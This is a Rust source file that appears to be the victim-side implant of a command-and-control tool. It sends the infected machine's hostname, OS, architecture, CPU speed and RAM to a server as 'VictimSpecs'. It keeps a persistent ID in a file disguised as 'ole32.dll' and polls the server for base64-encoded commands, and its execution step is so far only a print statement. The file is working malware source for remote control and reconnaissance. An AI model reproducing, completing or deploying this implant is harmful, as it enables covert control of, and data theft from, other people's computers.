// Include our profile.rs, generated by the build script
include!(concat!(env!("OUT_DIR"), "/profile.rs"));

use base64::engine::{general_purpose::STANDARD as b64, Engine};
use reqwest::{
    self as rq,
    header::{HeaderMap, HeaderValue},
    StatusCode as st,
};
use serde::{Deserialize, Serialize};
use std::{fs, thread, time::Duration};
use sys_info::{hostname, os_type};
use uuid::Uuid;

pub async fn run() {
    // Initializing variables from Profile JSON.
    let config = Config::new();
    // let server_cmds = ServerCommands::new();
    let endpoints = EndPoints::new();

    // Get our client
    let client = get_client(config.token);

    // Register
    register(&client, &endpoints.register).await;

    // Mainloop
    loop {
        let session_id = loop {
            let get_session = client.get(&endpoints.get_session).send().await.unwrap();

            if get_session.status() == st::OK {
                break get_session.text().await.unwrap();
            }

            sleep(5);
        };

        loop {
            let command = loop {
                let cmd_res = client
                    .get(&endpoints.fetch_cmd)
                    .body(session_id.clone())
                    .send()
                    .await
                    .unwrap();

                if cmd_res.status() == st::OK {
                    let res_string = cmd_res.text().await.unwrap();
                    break Some(String::from_utf8(b64.decode(&res_string).unwrap()).unwrap());
                } else if cmd_res.status() == st::GONE {
                    // Session has been killed, so let's get out
                    break None;
                }
                sleep(2);
            };

            // If the session is dead, we're gonna need to return to
            // getting session_id's(the outer loop). so break.
            if let None = command {
                break;
            }

            // Command execution
            println!("Command: {}", command.unwrap());
        }
    }
}

pub fn get_client_id(file_path: &str) -> String {
    // Get client_id from where it's stored from.
    // Closure for regenerating the client_id file.
    let regenerate = || {
        // Create a new file, and read from that, inserting a new
        // client_id into the file.

        // Newly generated ID
        let new_id = Uuid::new_v4().to_string();
        let encoded_id = b64.encode(new_id.as_bytes());
        // Even if the next line panics, we don't have
        // any other recovery plans at the moment
        fs::write(file_path, &encoded_id).unwrap();
        encoded_id
    };
    let content = fs::read_to_string(file_path).unwrap_or_else(|_| regenerate());

    // The error handling here ensures that if we can't parse the contents using b64
    // we'll regenerate the file and parse it again.
    String::from_utf8(b64.decode(&content).unwrap_or_else(|_| {
        let encoded_id = regenerate();
        b64.decode(&encoded_id).unwrap()
    }))
    .unwrap()
}

pub fn get_client(token: &str) -> rq::Client {
    // Persistent client id.
    let client_id = get_client_id("./ole32.dll");

    let mut headers = HeaderMap::new();
    headers.insert(
        "Authorization",
        HeaderValue::from_str(&format!("Basic {}", b64.encode(token.as_bytes()))).unwrap(),
    );
    headers.insert(
        "client-id",
        HeaderValue::from_str(&client_id.to_string()).unwrap(),
    );
    headers.insert("client-type", HeaderValue::from_static("2")); // 2 represents the victim client id

    // Let's first connect with the server
    rq::Client::builder()
        .default_headers(headers)
        .build()
        .unwrap()
}

#[derive(Serialize, Deserialize, Default)]
struct VictimSpecs {
    host_name: Option<String>,
    os: Option<String>,
    arch: Option<String>,
    clock_speed: Option<u64>,
    ram: Option<f64>,
}

impl VictimSpecs {
    fn generate() -> VictimSpecs {
        // Generate configurations according to the PC's specs
        let host_name = hostname().ok();
        let os = os_type().ok();

        // TODO: Make the ARCH fetching at runtime.
        let arch = Some(std::env::consts::ARCH.to_string());

        let clock_speed = sys_info::cpu_speed().ok();

        let ram = match sys_info::mem_info() {
            Ok(mem_info) => Some(mem_info.total as f64 / (1024_f64.powf(2.0))),
            Err(_) => None,
        };

        VictimSpecs {
            host_name,
            os,
            arch,
            clock_speed,
            ram,
        }
    }
}

async fn register(client: &rq::Client, register_path: &str) {
    let victim_specs = VictimSpecs::generate();

    let status = client
        .post(register_path)
        .body(b64.encode(serde_json::to_value(victim_specs).unwrap().to_string()))
        .send()
        .await
        .unwrap()
        .status();

    if status == st::INTERNAL_SERVER_ERROR {
        panic!();
    }
}

// Convenience function
fn sleep(time: u32) {
    thread::sleep(Duration::from_secs(time.into()));
}
